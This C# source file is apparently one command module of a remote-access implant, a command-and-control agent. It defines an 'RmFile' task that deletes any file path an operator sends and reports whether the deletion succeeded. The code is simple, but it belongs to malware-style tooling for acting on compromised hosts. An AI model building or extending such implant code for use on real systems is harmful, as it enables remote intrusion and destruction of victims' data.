using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Rmfile : ImplantCommands
    {
        private string targetFile { get; set; }
        public override string Name => "RmFile"; 
        public override string Execute(ImplantTask task)
        {
            targetFile = task.Args;

            File.Delete(targetFile);

            if(!(File.Exists(targetFile))) { return $"[*] {targetFile} removed\n"; }
            return $"[-] Failed to remove {targetFile}\n";
        }
    }
}
